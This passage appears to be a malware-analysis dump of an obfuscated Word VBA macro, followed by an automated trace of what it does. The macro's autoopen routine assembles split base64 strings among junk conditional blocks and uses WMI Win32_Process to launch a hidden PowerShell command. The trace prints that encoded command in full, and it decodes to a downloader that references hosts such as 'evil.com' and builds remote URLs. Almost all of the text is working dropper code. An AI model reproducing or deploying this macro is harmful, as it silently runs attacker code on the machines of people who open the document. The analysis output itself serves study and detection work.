+' STRIPPED LINE
+End If
+If TC1u___ Or uXAPxQ Then
+' STRIPPED LINE
+End If
+If F_D_jH_ Or Zvu_V_ Then
+' STRIPPED LINE
+End If
+XCB_d_s = "AGwAYQ" + "BjAG" + "UAKA" + "AkADk" + "ALA" + "AkAD" + "EAMAA"
+If G_DLSVR Or zU_W_NO Then
+' STRIPPED LINE
+End If
+fSf___ = "pACkAe" + "wBpAG" + "YAKA" + "AkAD" + "AAQg" + "A3AHUA"
+If G_Aigag Or UY_V5_ Then
+' STRIPPED LINE
+End If
+Cdn__t_ = "QwAxA" + "GYAU" + "wAz" + "ADoA" + "OgBFA" + "HgAaQB" + "zAHQA" + "cwAoA" + "CQATwB"
+If JoC1j_ Or auUu_I Then
+' STRIPPED LINE
+End If
+If Pjy__yj Or rA_WJs_ Then
+' STRIPPED LINE
+End If
+nj6tW1Q = "CAD" + "kANwB" + "hAF" + "oAKQ" + "ApA" + "HsAY" + "gByAG"
+w_1__z = z_a_V_ + m_sT__ + I_sXP_ + n7__GNo + aA_zTS + z1h4_9 + XCB_d_s + fSf___ + Cdn__t_ + nj6tW1Q
+If R_J___V Or dYD__PL Then
+' STRIPPED LINE
+End If
+If T_VW_R Or x__e_SH Then
+' STRIPPED LINE
+End If
+End Function
+Function en_Wd4()
+If KS_to0_ Or lnzVdx Then
+' STRIPPED LINE
+End If
+cx79X__ = "UAYQB" + "rAH0" + "ASQB" + "uAHYAb" + "wBrAGU" + "ALQB" + "XAGUA"
+If tX8LPG Or Xvn5xHl Then
+' STRIPPED LINE
+End If
+If tjq9d__ Or wS_Wv_ Then
+' STRIPPED LINE
+End If
+If k_KG_za Or e_dLZT Then
+' STRIPPED LINE
+End If
+wez_F_ = "YgB" + "SAGUA" + "cQB1A" + "GUA" + "cwB0" + "ACAAL"
+If ORB4NN6 Or cCb3SJ Then
+' STRIPPED LINE
+End If
+Yx7H__0 = "QBVAHI" + "AaQA" + "gACQAM" + "wBCA" + "DkAV" + "gBtAF" + "oAS" + "gAgAC" + "0AT"
+If ci4xF_h Or EkUBE__ Then
+' STRIPPED LINE
+End If
+EoE4x_ = "wB1AHQ" + "ARgB" + "pAGw" + "AZQAg" + "ACQ" + "ATwBCA" + "DkANw"
+If HqYLF_ Or j_H_m_ Then
+' STRIPPED LINE
+End If
+If gY_b_y Or E_KpIN Then
+' STRIPPED LINE
+End If
+Q4_tA47 = "BhAFo" + "AfQBz" + "AHQA" + "YQB" + "yAHQ" + "AIAAkA" + "E8AQg"
+If ghnF___ Or r3cq2UU Then
+' STRIPPED LINE
+End If
+If x_FTG_5 Or otaq__ Then
+' STRIPPED LINE
+End If
+If yMI__w Or c1eKUJ Then
+' STRIPPED LINE
+End If
+pGZT_h = "A5ADcA" + "YQBaAD" + "sAJABj" + "ADQAdA" + "A2A" + "GIAWg"
+If DLqE__ Or NFcqJt_ Then
+' STRIPPED LINE
+End If
+e3e1F_m = "BuAHU" + "APQAkA" + "GcATgB" + "OAGk" + "AcABXA"
+If QBN__r Or Z_9x_X_ Then
+' STRIPPED LINE
+End If
+oz_edDq = "CsA" + "JABPA" + "EIA" + "OQA3" + "AGEAW" + "gArA"
+If bNM___ Or ku_Wd_ Then
+' STRIPPED LINE
+End If
+If fA__uDP Or VEa___x Then
+' STRIPPED LINE
+End If
+If NXxN8C Or kKfr__X Then
+' STRIPPED LINE
+End If
+x4_8x__ = "CQA" + "TwBCAD" + "kANwB" + "hAF" + "oAOw" + "AkAG" + "cATgB" + "OAGkA" + "cAB"
+If BQGZUG_ Or usi6yr Then
+' STRIPPED LINE
+End If
+n0Qh_85 = "XAD0" + "AJA" + "BjAD" + "QAdAA" + "2AGIA"
+en_Wd4 = cx79X__ + wez_F_ + Yx7H__0 + EoE4x_ + Q4_tA47 + pGZT_h + e3e1F_m + oz_edDq + x4_8x__ + n0Qh_85
+If C_dt_4 Or fgnbF__ Then
+' STRIPPED LINE
+End If
+End Function
+Function X3R7tY()
+If XX_ZO0 Or fOzL_B3 Then
+' STRIPPED LINE
+End If
+If Cdof__q Or KI_VW4 Then
+' STRIPPED LINE
+End If
+DI__QJ = "WgBuA" + "HUA" + "OwBTAH" + "QAYQ" + "ByAH" + "QALQB"
+If Pklye_U Or n0__aq Then
+' STRIPPED LINE
+End If
+If NbVAG_z Or MW_Xh5_ Then
+' STRIPPED LINE
+End If
+W3bCQK_ = "TAGwAZ" + "QBl" + "AHA" + "AIAAt" + "AHMAI" + "AAxADs" + "AUgBlA"
+If a___y2R Or jh_5hm7 Then
+' STRIPPED LINE
+End If
+If x____A Or Ott4FkR Then
+' STRIPPED LINE
+End If
+If cyElH_v Or a_C_rm_ Then
+' STRIPPED LINE
+End If
+nEU__xI = "G0Abw" + "B2AGUA" + "LQBp" + "AHQAZQ" + "BtACA" + "ALQ" + "ByA" + "GUAYw"
+If o_K_g4 Or b7kXD_ Then
+' STRIPPED LINE
+End If
+If Jrae_i Or YI4_S_Z Then
+' STRIPPED LINE
+End If
+UPj_BS = "B1AHI" + "AcwBlA" + "CAA" + "LQB" + "wAG" + "EAdA" + "BoA" + "CAAIAA" + "oACQAS"
+If Mc1tRM Or zA_SWS Then
+' STRIPPED LINE
+End If
+If H_z9_Z Or aCXW31 Then
+' STRIPPED LINE
+End If
+BhL_Q__ = "ABvA" + "G0AZ" + "QArA" + "CIAXAA" + "iACsAJ" + "ABk" + "AGg"
+If BL3l_I Or hG__6_a Then
+' STRIPPED LINE
+End If
+JQ__jJ = "AZQBv" + "AEU" + "ATw" + "AxAH" + "kAL" + "gBy"
+If IW_K__ Or ONabAw Then
+' STRIPPED LINE
+End If
+If t_Bvr_ Or IMMlW_Q Then
+' STRIPPED LINE
+End If
+If G_PH0_ Or u_zY__ Then
+' STRIPPED LINE
+End If
+oJ1_zH = "AGUAc" + "ABsAG" + "EAY" + "wBlAC" + "gAJ" + "ABIAG8" + "AbQBl"
+If pX__W4T Or vvE_IR Then
+' STRIPPED LINE
+End If
+If Sq_F__ Or R24_1HM Then
+' STRIPPED LINE
+End If
+U77v__D = "ACsAI" + "gBc" + "ACI" + "ALA" + "AkA" + "FkA" + "UwBN"
+X3R7tY = DI__QJ + W3bCQK_ + nEU__xI + UPj_BS + BhL_Q__ + JQ__jJ + oJ1_zH + U77v__D
+If m__7OMT Or dN_Ff0 Then
+' STRIPPED LINE
+End If
+If U_aHWbF Or Lb_vQi Then
+' STRIPPED LINE
+End If
+If lvCCi_S Or Zdc_5_ Then
+' STRIPPED LINE
+End If
+End Function
+Function j__Gd_H()
+If dm___5O Or O_E_6_6 Then
+' STRIPPED LINE
+End If
+If gZISizw Or JZx_2K_ Then
+' STRIPPED LINE
+End If
+If cu92Mzb Or IK_FbP Then
+' STRIPPED LINE
+End If
+U_CCx_ = "AEw" + "AUwAp" + "AC4Acw" + "BwAG" + "wAaQB" + "0ACgAW" + "wBzAHQ"
+If q_vjFh_ Or Ta6I_U Then
+' STRIPPED LINE
+End If
+If qs9pB_ Or U_5MkL Then
+' STRIPPED LINE
+End If
+If eS__fAX Or UD_6uZ_ Then
+' STRIPPED LINE
+End If
+Lx9kg_ = "AcgBp" + "AG4AZw" + "BdA" + "FsAY" + "wBoAG"
+If cFdfB__ Or pwhc_n Then
+' STRIPPED LINE
+End If
+If Uj__Ndp Or DqI__n Then
+' STRIPPED LINE
+End If
+WTKk95m = "EAcg" + "BdADk" + "AMgA" + "pAFsA" + "MABdAC" + "kAOwBj" + "AGw"
+If TZoHmdt Or hYbqRWN Then
+' STRIPPED LINE
+End If
+If i_v_J__ Or MJAyj7 Then
+' STRIPPED LINE
+End If
+If gGzcGP Or V__b___ Then
+' STRIPPED LINE
+End If
+P_t_uy = "AZQB" + "hAHIAL" + "QBo" + "AGkA" + "cwB0" + "AG8Acg"
+If AuDT_J Or ls___gz Then
+' STRIPPED LINE
+End If
+If i_YRwKF Or Qe_5RR Then
+' STRIPPED LINE
+End If
+m_65__ = "B5A" + "DsA" + "fQBl" + "AGwAcw" + "BlAHsA" + "YwB"
+If SoRw_d Or r_zua_g Then
+' STRIPPED LINE
+End If
+If KWL99o Or W_rJOm_ Then
+' STRIPPED LINE
+End If
+If l9r_8PC Or VOl__n Then
+' STRIPPED LINE
+End If
+UGF9IL = "sAGUAY" + "QBy" + "AC0Aa" + "ABpAH" + "MAd" + "ABvAH"
+If AWR_hE Or chZ_3_ Then
+' STRIPPED LINE
+End If
+If ceq9oTq Or U_Y5_g Then
+' STRIPPED LINE
+End If
+q0VSlH = "IAe" + "QA7" + "AGUAe" + "ABpA" + "HQA" + "fQB9AC"
+If O1_cm0G Or qzM3I_O Then
+' STRIPPED LINE
+End If
+If hzWaAE Or Zzcl_ng Then
+' STRIPPED LINE
+End If
+t6NpdT = "QAbw" + "BLAE" + "8AYwB" + "iAEcA" + "MQBE"
+If n_1QTui Or zF_4r_m Then
+' STRIPPED LINE
+End If
+zwtshNP = "AEM" + "APQ" + "AkAEcA" + "OQA2" + "AGg" + "ASgBw"
+j__Gd_H = U_CCx_ + Lx9kg_ + WTKk95m + P_t_uy + m_65__ + UGF9IL + q0VSlH + t6NpdT + zwtshNP
+If s_i____ Or Z6U7B1r Then
+' STRIPPED LINE
+End If
+If X_w_qZ Or Mo_XZ_ Then
+' STRIPPED LINE
+End If
+End Function
+Function v5QU5I()
+If z_A_xns Or M3BAr6_ Then
+' STRIPPED LINE
+End If
+If jk9pcl_ Or A_ahxR Then
+' STRIPPED LINE
+End If
+L_vEpl = "ACsAJ" + "ABxAH" + "IAVgB" + "0AH" + "EAMg" + "BwA" + "HgA" + "QwA="
+v5QU5I = L_vEpl
+If az____T Or Nki50Q_ Then
+' STRIPPED LINE
+End If
+If NQ3k_W9 Or B__l_q Then
+' STRIPPED LINE
+End If
+If PV_3_Ks Or A7EDlsy Then
+' STRIPPED LINE
+End If
+End Function
+Function o_I2Js(Y1ZCttj, eWlo2_)
+On Error Resume Next
+If u_H_YSj Or K_eUH_ Then
+' STRIPPED LINE
+End If
+If SrYyVp Or atWkEKG Then
+' STRIPPED LINE
+End If
+r____G = pmus_ZO + "winmgmts:Win32" + UMLI__Y + "_Process" + s_Wc_ix
+If vMpiDX_ Or Cbu_NG Then
+' STRIPPED LINE
+End If
+If dbupDc Or qw_Jf_ Then
+' STRIPPED LINE
+End If
+If IKM_SQ_ Or MT_w3T Then
+' STRIPPED LINE
+End If
+If Hz_2Zil Or Gq_5ZN Then
+' STRIPPED LINE
+End If
+If r9EcC_7 Or syLT_N Then
+' STRIPPED LINE
+End If
+If BSh_qfa Or S_7Kp_ Then
+' STRIPPED LINE
+End If
+If rNhZf_ Or aRv3w3v Then
+' STRIPPED LINE
+End If
+v8Vwi_ = lwO2kH0 + "winmgmts:Win32" + AEs_m_v + "_ProcessStartup" + F7eKCE
+If M__3tzW Or s4wRJ53 Then
+' STRIPPED LINE
+End If
+If pa_QW_ Or VY_9sZ Then
+' STRIPPED LINE
+End If
+If j_PTT9_ Or XqRRzL Then
+' STRIPPED LINE
+End If
+If ifA9HNH Or f_4ykyr Then
+' STRIPPED LINE
+End If
+If pg3dD4u Or svsm_DY Then
+' STRIPPED LINE
+End If
+If sa_3s_A Or uK_a_U Then
+' STRIPPED LINE
+End If
+If Y__00mn Or cMGHPI Then
+' STRIPPED LINE
+End If
+If OCN_43O Or G__sip Then
+' STRIPPED LINE
+End If
+If wyI_aE Or u_18_A Then
+' STRIPPED LINE
+End If
+If ahK_Snk Or u_Vi_FZ Then
+' STRIPPED LINE
+End If
+If X_GcS_y Or r6J8iEg Then
+' STRIPPED LINE
+End If
+If OeQ0_L9 Or HfOpD_ Then
+' STRIPPED LINE
+End If
+If Ic_m3k6 Or n_TodL Then
+' STRIPPED LINE
+End If
+V_4VZ6_ = GetObject(r0vGf_ + r____G + DstUif).Create((x_I8eID + Y1ZCttj + JuxuLm_ + bJQq_2 + VjHOw_M + HYPEg_A), bn_u3i, pQ_QtL, n_K_1VZ)
+If ksGWUJG Or DsL_H3_ Then
+' STRIPPED LINE
+End If
+If zz_CcYY Or yRnQ_L Then
+' STRIPPED LINE
+End If
+If MGEsA_ Or GW_i0lc Then
+' STRIPPED LINE
+End If
+If J_60b_O Or H_aCsdq Then
+' STRIPPED LINE
+End If
+If OL5fLCP Or b909__ Then
+' STRIPPED LINE
+End If
+If Vqlv_i Or kPuWvX4 Then
+' STRIPPED LINE
+End If
+If Bhx_bR_ Or ZWrwaKm Then
+' STRIPPED LINE
+End If
+End Function
+Sub autoopen()
+On Error Resume Next
+If W_T_RR5 Or zUSUx_x Then
+' STRIPPED LINE
+End If
+If vU__AtW Or h_K9VD Then
+' STRIPPED LINE
+End If
+If ZA0n_b Or pJb___W Then
+' STRIPPED LINE
+End If
+If RKT7_TQ Or CJUPV_ Then
+' STRIPPED LINE
+End If
+o_I2Js (YfFE_K + "po" + hwJOnO + "wers" + BdMw__p + "heLl -w h -e " + i_j1_Al + sIy_rR_ + K6srFE + u_rf6_ + uj_dg_U + J_4QJ_ + lbRf9O_ + Wm_W_6 + Hf_T7sK + Bs___dW + A_Pc_y_ + w0U__As + M_EkFn + C5__i_H + kRNg_J_ + BLs__N + YvC___t + z5Qa_f_ + H__8qW + FRya6S + Vx_QZ3 + DmyzpR_ + e9_fWvT + nHbrCyW + H0I5i_ + voWFB_x + W0___8d + LRZmTFE + S_hVc_ + U57_Em4 + UUrXVX_ + NSp_AV_ + w_xS3F + VcVzN_ + E_F_Ud8 + DQUlnB + Add51_ + FDrjUo + V_wC_W + l_oD0j + TNSw__ + YXYjO1 + w_1__z + en_Wd4 + X3R7tY + j__Gd_H + v5QU5I), (dBMSd_ + NuJ___M + lzHoWQ + q5_K_ch)
+If Y_Z2_Ys Or ez2BTxK Then
+' STRIPPED LINE
+End If
+If t_uovjR Or h_KjA0q Then
+' STRIPPED LINE
+End If
+If SF_aleq Or eYDQ_RO Then
+' STRIPPED LINE
+End If
+If y_d_b__ Or ef__mbf Then
+' STRIPPED LINE
+End If
+End Sub
+
+
+
+
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+
+-------------------------------------------------------------------------------
+TRACING VBA CODE (entrypoint = Auto*):
+
+Recorded Actions:
++-------------------+---------------------------+---------------------------+
+| Action            | Parameters                | Description               |
++-------------------+---------------------------+---------------------------+
+| Found Entry Point | autoopen                  |                           |
+| GetObject         | ['winmgmts:Win32_Process' | Interesting Function Call |
+|                   | ]                         |                           |
+| Create            | ['powersheLl -w h -e 0JAB | Interesting Function Call |
+|                   | RAEkAcwBtAHQAPQAnAGUAdgBp |                           |
+|                   | AGwALgBjAG8AbQAnADsAJABqA |                           |
+|                   | DYAUgA5AEIAPQAnAGUAdgBpAG |                           |
+|                   | wALgBvAHIAZwAnADsAJABpAE0 |                           |
+|                   | ANgBQAEkAZgBTADQAMAA9ACcA |                           |
+|                   | dwBoAGEAdABpAHMAbQB5AGkAc |                           |
+|                   | AAuAGMAbwBtACcAOwBTAHYAIA |                           |
+|                   | AgACgAJwAwAEIANwB1AEMAMQB |                           |
+|                   | mAFMAMwAnACkAIAAoAFsAdAB5 |                           |
+|                   | AHAAZQBdACgAIgB7ADkAfQB7A |                           |
+|                   | DEAMQB9AHsANwB9AHsAMwB9AH |                           |
+|                   | sAOAB9AHsANgB9AHsANAB9AHs |                           |
+|                   | AMQAwAH0AewAwAH0AewA0AH0A |                           |
+|                   | ewAxAH0AewAyAH0AewA1AH0Ae |                           |
+|                   | wAxADIAfQAiACAALQBmACcAbw |                           |
+|                   | AnACwAJwBGACcALAAnAGkAJwA |                           |
+|                   | sACcAVAAnACwAJwAuACcALAAn |                           |
+|                   | AGwAJwAsACcATQAnACwAJwBzA |                           |
+|                   | CcALAAnAGUAJwAsACcAUwAnAC |                           |
+|                   | wAJwBJACcALAAnAHkAJwAsACc |                           |
+|                   | ARQAnACkAKQA7ACQARQBLAGMA |                           |
+|                   | MABZAHIAeQBUAGIAIAA9ACAAJ |                           |
+|                   | ABLAGIAUQA1AGQAaAB6ACAAKw |                           |
+|                   | AgACQAYQByAGcAcwBbADAAXQA |                           |
+|                   | 7ACQAZgA2AEIAMAB4AE8AIAA9 |                           |
+|                   | ACAAIgBpAGYAYwBvAG4AZgBpA |                           |
+|                   | GcALgBtAGUAIgA7AHMAVgAgAC |                           |
+|                   | AAKAAnAEgAYwBvAFUAUQBQACc |                           |
+|                   | AKQAgACgAWwB0AHkAUABlAF0A |                           |
+|                   | KAAiAHsANwB9AHsANAB9AHsAO |                           |
+|                   | QB9AHsAMQAwAH0AewA4AH0Aew |                           |
+|                   | A2AH0AewA1AH0AewAzAH0AewA |                           |
+|                   | xAH0AewA1AH0AewAxADEAfQB7 |                           |
+|                   | ADMAfQB7ADIAfQB7ADgAfQB7A |                           |
+|                   | DAAfQB7ADEAMAB9AHsAMQB9AH |                           |
+|                   | sAMgB9AHsANAB9ACIAIAAtAGY |                           |
+|                   | AJwBDACcALAAnAE8AJwAsACcA |                           |
+|                   | cgAnACwAJwBpACcALAAnAFkAJ |                           |
+|                   | wAsACcALgAnACwAJwBNACcALA |                           |
+|                   | AnAHMAJwAsACcARQAnACwAJwB |                           |
+|                   | TACcALAAnAHQAJwAsACcAZAAn |                           |
+|                   | ACkAKQA7AHMAdgAgACgAJwBJA |                           |
+|                   | EcAegBwAHkANQB2AGEASQB5AC |                           |
+|                   | cAKQAgACgAWwB0AHkAcABlAF0 |                           |
+|                   | AKAAiAHsAMQAwAH0AewAwAH0A |                           |
+|                   | ewAxADAAfQB7ADEAMQB9AHsAO |                           |
+|                   | AB9AHsAMwB9AHsAMQB9AHsAMQ |                           |
+|                   | A0AH0AewAxADIAfQB7ADEAMQB |                           |
+|                   | 9AHsAMQB9AHsANAB9AHsAOAB9 |                           |
+|                   | AHsANgB9AHsANwB9AHsAOQB9A |                           |
+|                   | HsAMQAzAH0AewA4AH0AewA1AH |                           |
+|                   | 0AewAyAH0AIgAgAC0AZgAnAFk |                           |
+|                   | AJwAsACcALgAnACwAJwBUACcA |                           |
+|                   | LAAnAE0AJwAsACcAdwAnACwAJ |                           |
+|                   | wBOACcALAAnAGIAJwAsACcAYw |                           |
+|                   | AnACwAJwBlACcALAAnAEwAJwA |                           |
+|                   | sACcAUwAnACwAJwB0ACcALAAn |                           |
+|                   | AEUAJwAsACcASQAnACwAJwBuA |                           |
+|                   | CcAKQApADsAJAB5AEMANABKAG |                           |
+|                   | kAMgAgAD0AIAAiAGYAcgBlAGU |                           |
+|                   | AZwBlAG8AaQBwAC4AYQBwAHAA |                           |
+|                   | IgA7ACQAZQAzAGYAMQA1ADkAI |                           |
+|                   | AA9ACAAJABqADYAUgA5AEIAIA |                           |
+|                   | ArACAAJABJAFAAdQB1AHYANgB |                           |
+|                   | OADsAJABJAFAAdQB1AHYANgBO |                           |
+|                   | ACAAPQAgACIAbwB4AG0AbAB4A |                           |
+|                   | G0AbABvAHgAbQBsACIALgByAG |                           |
+|                   | UAcABsAGEAYwBlACgAKAAiAG8 |                           |
+|                   | AIgArACIAeABtACIAKwAiAGwA |                           |
+|                   | IgApACwAWwBzAHQAcgBpAG4AZ |                           |
+|                   | wBdAFsAYwBoAGEAcgBdADQANw |                           |
+|                   | ApADsAJAAyAFQAdwBPAE4ARgB |                           |
+|                   | aACAAPQAgACQAeQBDADQASgBp |                           |
+|                   | ADIAIAArACAAJABJAFAAdQB1A |                           |
+|                   | HYANgBOADsAaQBmACgAVABlAH |                           |
+|                   | MAdAAtAEMAbwBuAG4AZQBjAHQ |                           |
+|                   | AaQBvAG4AIAAtAFEAdQBpAGUA |                           |
+|                   | dAAgACQAUQBJAHMAbQB0ACkAe |                           |
+|                   | wBlAHgAaQB0AH0AZQBsAHMAZQ |                           |
+|                   | B7AGkAZgAoAFQAZQBzAHQALQB |                           |
+|                   | DAG8AbgBuAGUAYwB0AGkAbwBu |                           |
+|                   | ACAALQBRAHUAaQBlAHQAIAAkA |                           |
+|                   | GoANgBSADkAQgApAHsAJABjAF |                           |
+|                   | IAYgBjAG8ANgBxADEAUgBWAD0 |                           |
+|                   | AIAAoACgAJwBoAHQAJwArACgA |                           |
+|                   | JwAnACsAJwBBADgAaABxACkAK |                           |
+|                   | AA2AEEAJwArACcAMwBjACcAKQ |                           |
+|                   | ArACcAdABwAHMAOgAnACsAKAA |                           |
+|                   | nAEEAOAAnACsAJwBoAHEAKQAo |                           |
+|                   | ADYAJwArACcAQQAzAGMAJwApA |                           |
+|                   | CsAJwAnACsAJwBxAF8AeAA9AH |                           |
+|                   | EAcQBfAHgAPQBxAGgAJwArACc |                           |
+|                   | AZQBsAHMAJwArACgAJwBBADgA |                           |
+|                   | aABxACkAKAA2AEEAMwBjACcAK |                           |
+|                   | QArACcAJwArACcAZQBjACcAKw |                           |
+|                   | AoACcAQQAnACsAJwA4AGgAcQA |                           |
+|                   | pACgAJwArACcANgBBADMAYwAn |                           |
+|                   | ACkAKwAnAHQAZgAuAG4AJwArA |                           |
+|                   | CcAbwBxAF8AeAA9AHEAYgAnAC |                           |
+|                   | sAKAAnAEEAJwArACcAOABoAHE |                           |
+|                   | AKQAoACcAKwAnADYAQQAzAGMA |                           |
+|                   | JwApACsAJwBpACcAKwAnAGwAZ |                           |
+|                   | ABlAHIAJwArACcAcQBfAHgAPQ |                           |
+|                   | BxADEAJwArACgAJwBBADgAJwA |                           |
+|                   | rACcAaABxACkAKAAnACsAJwA2 |                           |
+|                   | AEEAJwArACcAMwBjACcAKQArA |                           |
+|                   | CcAXwAnACsAJwAxAGUAZAAnAC |                           |
+|                   | sAKAAnACcAKwAnAEEAOABoAHE |                           |
+|                   | AKQAoADYAQQAnACsAJwAzAGMA |                           |
+|                   | JwApACsAJwA5AGUAMQAnACsAJ |                           |
+|                   | wBiADcAZQBkACcAKwAoACcAQQ |                           |
+|                   | AnACsAJwA4AGgAcQApACgANgA |                           |
+|                   | nACsAJwBBADMAYwAnACkAKwAn |                           |
+|                   | ADAAMwAnACsAKAAnAEEAJwArA |                           |
+|                   | CcAOABoAHEAKQAoACcAKwAnAD |                           |
+|                   | YAQQAzAGMAJwApACsAJwA4ADk |                           |
+|                   | AJwArACcAZQBhADMAJwArACgA |                           |
+|                   | JwBBADgAJwArACcAaABxACkAK |                           |
+|                   | AA2AEEAJwArACcAMwBjACcAKQ |                           |
+|                   | ArACcANAAnACsAJwAzAGEAMQA |                           |
+|                   | nACsAKAAnAEEAOAAnACsAJwBo |                           |
+|                   | AHEAKQAoADYAJwArACcAQQAzA |                           |
+|                   | GMAJwApACsAJwBiAGIAMgAnAC |                           |
+|                   | sAKAAnACcAKwAnAEEAOABoAHE |                           |
+|                   | AKQAoADYAJwArACcAQQAzAGMA |                           |
+|                   | JwApACsAJwBiADgAJwArACgAJ |                           |
+|                   | wBBACcAKwAnADgAaABxACkAKA |                           |
+|                   | A2ACcAKwAnAEEAMwBjACcAKQA |                           |
+|                   | rACcAJwArACcANABiACcAKwAn |                           |
+|                   | ADkAZQAnACsAKAAnAEEAOAAnA |                           |
+|                   | CsAJwBoAHEAKQAoADYAQQAzAG |                           |
+|                   | MAJwApACsAJwA4ACcAKwAnADI |                           |
+|                   | ALgBqAHAAJwArACgAJwBBACcA |                           |
+|                   | KwAnADgAaABxACkAKAA2ACcAK |                           |
+|                   | wAnAEEAMwBjACcAKQArACcAZw |                           |
+|                   | AnACsAKAAnAEEAOAAnACsAJwB |                           |
+|                   | oAHEAKQAoADYAJwArACcAQQAz |                           |
+|                   | AGMAJwApACsAJwAnACsAJwBAA |                           |
+|                   | GgAdAAnACsAJwB0AHAAJwArAC |                           |
+|                   | cAcwA6ACcAKwAoACcAJwArACc |                           |
+|                   | AQQA4AGgAcQApACgANgBBACcA |                           |
+|                   | KwAnADMAYwAnACkAKwAnAHEAX |                           |
+|                   | wB4AD0AcQBxAF8AeAA9AHEAaA |                           |
+|                   | AnACsAJwBlAGwAcwBlACcAKwA |                           |
+|                   | oACcAQQAnACsAJwA4AGgAcQAp |                           |
+|                   | ACgANgBBACcAKwAnADMAYwAnA |                           |
+|                   | CkAKwAnACcAKwAnAGMAdABmAC |                           |
+|                   | 4AJwArACgAJwAnACsAJwBBADg |                           |
+|                   | AaABxACkAKAAnACsAJwA2AEEA |                           |
+|                   | MwBjACcAKQArACcAbgAnACsAJ |                           |
+|                   | wBvAHEAXwB4AD0AcQAnACsAKA |                           |
+|                   | AnAEEAOABoAHEAKQAoADYAQQA |                           |
+|                   | nACsAJwAzAGMAJwApACsAJwBi |                           |
+|                   | ACcAKwAnAGkAbABkACcAKwAoA |                           |
+|                   | CcAQQA4ACcAKwAnAGgAcQApAC |                           |
+|                   | gAJwArACcANgBBADMAYwAnACk |                           |
+|                   | AKwAnACcAKwAnAGUAcgAnACsA |                           |
+|                   | KAAnAEEAOABoAHEAKQAoADYAQ |                           |
+|                   | QAzAGMAJwApACsAJwAnACsAJw |                           |
+|                   | BxAF8AeAA9AHEAMgBfACcAKwA |                           |
+|                   | oACcAQQA4AGgAcQApACgANgAn |                           |
+|                   | ACsAJwBBADMAYwAnACkAKwAnA |                           |
+|                   | GMAJwArACgAJwAnACsAJwBBAD |                           |
+|                   | gAaABxACkAKAA2ACcAKwAnAEE |                           |
+|                   | AMwBjACcAKQArACcAMgA1ACcA |                           |
+|                   | KwAnAGQAZgAnACsAJwA1ADkAN |                           |
+|                   | AAnACsAKAAnACcAKwAnAEEAOA |                           |
+|                   | BoAHEAKQAoADYAQQAzAGMAJwA |                           |
+|                   | pACsAJwA0ACcAKwAnAGUANAA5 |                           |
+|                   | ACcAKwAnAGYANQAxACcAKwAoA |                           |
+|                   | CcAQQAnACsAJwA4AGgAcQApAC |                           |
+|                   | gANgBBACcAKwAnADMAYwAnACk |                           |
+|                   | AKwAnACcAKwAnADMAOQAzADcA |                           |
+|                   | JwArACcAZABkADAAJwArACgAJ |                           |
+|                   | wBBACcAKwAnADgAaABxACkAKA |                           |
+|                   | AnACsAJwA2AEEAMwBjACcAKQA |                           |
+|                   | rACcANwA3ACcAKwAnADkANAA3 |                           |
+|                   | ACcAKwAoACcAJwArACcAQQA4A |                           |
+|                   | CcAKwAnAGgAcQApACgANgAnAC |                           |
+|                   | sAJwBBADMAYwAnACkAKwAnACc |                           |
+|                   | AKwAnAGYAYgA1ACcAKwAoACcA |                           |
+|                   | JwArACcAQQA4AGgAcQApACgAN |                           |
+|                   | gBBACcAKwAnADMAYwAnACkAKw |                           |
+|                   | AnADAAJwArACgAJwBBADgAaAB |                           |
+|                   | xACkAKAAnACsAJwA2AEEAMwBj |                           |
+|                   | ACcAKQArACcANAAuACcAKwAnA |                           |
+|                   | GoAcAAnACsAKAAnAEEAOABoAH |                           |
+|                   | EAKQAoADYAQQAzAGMAJwApACs |                           |
+|                   | AJwBnACcAKwAnAEAAaAB0ACcA |                           |
+|                   | KwAnAHQAcAAnACsAKAAnACcAK |                           |
+|                   | wAnAEEAOABoAHEAKQAoADYAQQ |                           |
+|                   | AnACsAJwAzAGMAJwApACsAJwB |                           |
+|                   | zADoAcQBfAHgAPQBxACcAKwAo |                           |
+|                   | ACcAJwArACcAQQA4AGgAcQApA |                           |
+|                   | CgANgAnACsAJwBBADMAYwAnAC |                           |
+|                   | kAKwAnAHEAXwB4AD0AcQAnACs |                           |
+|                   | AKAAnAEEAOABoAHEAKQAoADYA |                           |
+|                   | QQAnACsAJwAzAGMAJwApACsAJ |                           |
+|                   | wBoAGUAJwArACcAbABzAGUAJw |                           |
+|                   | ArACgAJwBBACcAKwAnADgAaAB |                           |
+|                   | xACkAKAA2ACcAKwAnAEEAMwBj |                           |
+|                   | ACcAKQArACcAYwAnACsAKAAnA |                           |
+|                   | EEAOABoAHEAKQAoADYAQQAzAG |                           |
+|                   | MAJwApACsAJwB0ACcAKwAoACc |                           |
+|                   | AQQAnACsAJwA4AGgAcQApACgA |                           |
+|                   | NgBBADMAYwAnACkAKwAnACcAK |                           |
+|                   | wAnAGYALgBuAG8AcQBfAHgAPQ |                           |
+|                   | BxACcAKwAoACcAQQAnACsAJwA |                           |
+|                   | 4AGgAcQApACgANgAnACsAJwBB |                           |
+|                   | ADMAYwAnACkAKwAnACcAKwAnA |                           |
+|                   | GIAaQBsACcAKwAnAGQAZQByAC |                           |
+|                   | cAKwAoACcAJwArACcAQQA4AGg |                           |
+|                   | AcQApACgANgAnACsAJwBBADMA |                           |
+|                   | YwAnACkAKwAnAHEAXwB4AD0Ac |                           |
+|                   | QAzACcAKwAnAF8AYwAyACcAKw |                           |
+|                   | AoACcAQQA4AGgAcQApACgANgB |                           |
+|                   | BACcAKwAnADMAYwAnACkAKwAn |                           |
+|                   | AGMAJwArACcANQA5AGMAJwArA |                           |
+|                   | CcAMAA3AGQAJwArACgAJwBBAC |                           |
+|                   | cAKwAnADgAaABxACkAKAAnACs |                           |
+|                   | AJwA2AEEAMwBjACcAKQArACcA |                           |
+|                   | JwArACcAMQA2AGMAYwAnACsAJ |                           |
+|                   | wA5ADcAJwArACgAJwBBADgAJw |                           |
+|                   | ArACcAaABxACkAKAA2AEEAMwB |                           |
+|                   | jACcAKQArACcAOQAyADUAJwAr |                           |
+|                   | ACcAOQAwADkAJwArACgAJwAnA |                           |
+|                   | CsAJwBBADgAaABxACkAKAA2AE |                           |
+|                   | EAJwArACcAMwBjACcAKQArACc |                           |
+|                   | AYwAnACsAJwA5ADkAMwA3ADYA |                           |
+|                   | JwArACgAJwBBADgAJwArACcAa |                           |
+|                   | ABxACkAKAA2ACcAKwAnAEEAMw |                           |
+|                   | BjACcAKQArACcAYQBhAGYAJwA |                           |
+|                   | rACgAJwAnACsAJwBBADgAaABx |                           |
+|                   | ACkAKAA2AEEAMwBjACcAKQArA |                           |
